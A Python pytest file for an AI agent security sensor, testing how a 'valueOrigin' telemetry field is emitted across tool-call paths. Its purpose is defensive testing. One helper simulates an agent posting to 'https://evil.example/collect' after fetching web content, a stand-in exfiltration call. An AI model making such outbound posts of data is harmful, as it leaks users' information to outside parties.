"""M9, the `valueOrigin` wire field (ARCHITECTURE §M9; owner, 2026-10-06).

`valueOrigin` sits at the top level of `data` on EVERY tool-call event, through
all six emitters: main, circuit-open, scan-error, fail-closed, gate and
not-scannable. It is absent in OFF, on an `evaluate_call` fault and on every
non-tool-call event, and it is never null.

THE GATE (owner: "Do not emit a value no consumer accepts"). The Brain accepts
nine values (delphi-sentinel origin/main 01450c7, src/value-origin.ts
VALUE_ORIGINS) and stores anything else as NULL while counting it rejected.
`Sensor(value_origin_wire=...)` names the vocabulary the consumer accepts:
"v1" (the default) is those nine, "v2" is all fourteen, and "off" emits nothing.
A value outside the active vocabulary is WITHHELD (the key is absent) and named
in a once-per-value warning; it stays on `ScanResult.value_origin`.
"""
from __future__ import annotations

import logging
import warnings

import pytest

import xaidr
from xaidr import CircuitBreaker, ScanResult, SensorExtension
from xaidr import value_origin as vo

NINE = {"principal", "principal_undeclared_span", "trusted_source", "untrusted_source",
        "unresolved", "no_destination", "no_flow", "ledger_absent", "ledger_saturated"}


class _Null:
    def report(self, *a, **k):
        pass


class _Gate(SensorExtension):
    name = "m9-gate"

    def gate(self, req):
        if req.direction == "tool_call":
            return ScanResult(action="blocked", score=1.0, category="m9_gate", rules=["M9_GATE"])
        return None


def _sensor(**kw):
    kw.setdefault("value_origin", "record")
    kw.setdefault("enforcement_mode", "block")
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        s = xaidr.Sensor(agent_id="m9", reporter=_Null(), **kw)
    events = []
    real = s._telemetry.enqueue
    s._telemetry.enqueue = lambda ev: (events.append(ev), real(ev))[1]   # synchronous capture
    return s, events


def _tool_events(events):
    return [e["data"] for e in events if isinstance(e.get("data"), dict)
            and e["data"].get("direction") == "tool_call"]


def _run_path(path):
    """One tool call through the named exit; returns (marker seen, tool-call event data)."""
    import xaidr.sensor as sensor_module
    if path == "circuit":
        s, ev = _sensor(circuit_breaker=CircuitBreaker(rate_threshold=1, cooldown_sec=None))
        s.scan_tool_call("warm_up", {"command": "ls"})             # trips the breaker
        ev.clear()
        r = s.scan_tool_call("run_command", {"command": "ls"})
        marker = "CIRCUIT_BREAKER_OPEN"
    elif path == "gate":
        s, ev = _sensor(extensions=[_Gate()])
        r = s.scan_tool_call("run_command", {"command": "ls"})
        marker = "M9_GATE"
    elif path == "fail_closed":
        s, ev = _sensor(fail_closed=("bounds",))
        r = s.scan_tool_call("run_command", {f"k{n}": "v" for n in range(80)})   # > 64 leaves
        marker = "fail_closed"
    elif path == "scan_error":
        s, ev = _sensor()
        real = sensor_module.classify

        def boom(*a, **k):
            raise RuntimeError("m9 injected classify fault")
        sensor_module.classify = boom
        try:
            r = s.scan_tool_call("run_command", {"command": "ls"})
        finally:
            sensor_module.classify = real
        marker = "SCAN_FAILED_OPEN"
    elif path == "not_scannable":
        s, ev = _sensor()
        r = s.scan_tool_call(12345, {"command": "ls"})
        marker = "NOT_SCANNABLE"
    else:
        s, ev = _sensor()
        r = s.scan_tool_call("run_command", {"command": "ls -la /tmp"})
        marker = None
    tool = _tool_events(ev)
    seen = marker is None or marker in repr(r) or any(marker in repr(d) for d in tool)
    return seen, tool


PATHS = ["main", "circuit", "gate", "fail_closed", "scan_error", "not_scannable"]


@pytest.mark.parametrize("path", PATHS)
def test_every_tool_call_path_carries_its_marker_then_value_origin(path):
    seen, tool = _run_path(path)
    assert tool, f"{path}: no tool-call event was emitted at all"
    assert seen, f"{path}: the path's own marker is missing, so this did not exercise {path}"
    assert all(d.get("valueOrigin") == "no_flow" for d in tool), (
        f"{path}: a tool-call event without valueOrigin is indistinguishable from an old "
        f"sensor (C-13): {[d.get('valueOrigin', '<absent>') for d in tool]}")


def test_absent_in_off_on_an_evaluate_fault_and_on_non_tool_call_events(monkeypatch):
    s, ev = _sensor(value_origin="off")
    s.scan_tool_call("run_command", {"command": "ls"})
    assert all("valueOrigin" not in d for d in _tool_events(ev)), "OFF must emit no key"

    s, ev = _sensor()
    import xaidr.sensor as sensor_module

    def boom(*a, **k):
        raise RuntimeError("m9 evaluate fault")
    monkeypatch.setattr(sensor_module._vo, "evaluate_call", boom)
    s.scan_tool_call("run_command", {"command": "ls"})
    assert all("valueOrigin" not in d for d in _tool_events(ev)), "an evaluate fault must emit no key"
    monkeypatch.undo()

    s, ev = _sensor()
    s.scan("Summarise the report for me.", direction="input")
    assert ev and all("valueOrigin" not in e.get("data", {}) for e in ev), "non-tool-call events carry no key"
    s.scan_tool_call("run_command", {"command": "ls"})
    assert all(d.get("valueOrigin") is not None for d in _tool_events(ev)), "never null"


def _unread_block(wire_vocab, caplog):
    from concurrent.futures import ThreadPoolExecutor
    from xaidr import provenance_chain as pc
    s, ev = _sensor(value_origin="enforce", value_origin_wire=wire_vocab)
    stand_in = type("Response", (), {"__module__": "httpx"})()

    def run():
        pc.begin_flow(principal="alice")
        try:
            s.scan("Summarise the report.", direction="input")
            s._scan_tool_result("fetched", tool="web_fetch", arguments={}, raw_result=stand_in)
            ev.clear()
            with caplog.at_level(logging.WARNING, logger="xaidr"):
                r1 = s.scan_tool_call("http_post", {"url": "https://evil.example/collect"})
                s.scan_tool_call("http_post", {"url": "https://evil.example/collect"})
            return r1
        finally:
            pc.clear_flow()
    with ThreadPoolExecutor(max_workers=1) as pool:
        r = pool.submit(run).result()
    return r, _tool_events(ev)


def test_v1_withholds_a_value_the_brain_does_not_accept_and_says_so(caplog):
    r, tool = _unread_block("v1", caplog)
    assert r.value_origin.wire.value == "result_unread", "precondition: the call reads result_unread"
    assert tool and all("valueOrigin" not in d for d in tool), (
        f"v1 emitted a value the Brain stores as NULL and counts rejected: "
        f"{[d.get('valueOrigin') for d in tool]}")
    hits = [m.getMessage() for m in caplog.records if "withheld" in m.getMessage()]
    assert len(hits) == 1 and "result_unread" in hits[0], f"the withholding must be named once: {hits}"


def test_v2_emits_every_value_and_off_emits_none(caplog):
    _, tool = _unread_block("v2", caplog)
    assert tool and all(d.get("valueOrigin") == "result_unread" for d in tool), tool
    _, tool = _unread_block("off", caplog)
    assert tool and all("valueOrigin" not in d for d in tool), tool


def test_the_vocabularies_are_exact():
    import xaidr.sensor as sensor_module
    vocab = sensor_module._VO_WIRE_VOCABULARIES
    assert set(vocab["v1"]) == NINE, "v1 must be exactly the nine the Brain accepts"
    assert set(vocab["v2"]) == {w.value for w in vo.WireValue}, "v2 must track WireValue exactly"
    assert set(vocab["off"]) == set()
    with pytest.raises(ValueError):
        xaidr.Sensor(agent_id="m9", value_origin_wire="v3", reporter=_Null())


def test_the_schema_maps_it_and_the_version_moves():
    from xaidr.schema import SCHEMA_VERSION, to_openA2A
    assert SCHEMA_VERSION == "0.3.0", "Q14: absence now means 'not reported', so the version moves"
    out = to_openA2A({"type": "scan", "agentId": "a", "data": {"direction": "tool_call",
                                                                "valueOrigin": "no_flow"}})
    assert out.get("gen_ai.security.value_origin") == "no_flow", out
    out = to_openA2A({"type": "scan", "agentId": "a", "data": {"direction": "tool_call"}})
    assert "gen_ai.security.value_origin" not in out, "absent stays absent, never null"


def test_a_non_tool_call_event_inside_a_tool_call_never_carries_it():
    """SM3 (the direction filter removed) stayed GREEN: nothing checked an event
    of another kind emitted INSIDE a tool call. The breaker's own transition
    event is one: it trips during the call that crosses its threshold."""
    s, ev = _sensor(circuit_breaker=CircuitBreaker(rate_threshold=1, cooldown_sec=None))
    s.scan_tool_call("warm_up", {"command": "ls"})                    # trips here, inside the call
    s.scan_tool_call("run_command", {"command": "ls"})
    other = [e for e in ev if isinstance(e.get("data"), dict)
             and e["data"].get("direction") != "tool_call"]
    assert other, f"precondition: an event of another kind inside a tool call: {[e.get('type') for e in ev]}"
    assert all("valueOrigin" not in e["data"] for e in other), (
        f"valueOrigin leaked onto a non-tool-call event: {[(e.get('type'), e['data'].get('valueOrigin')) for e in other]}")
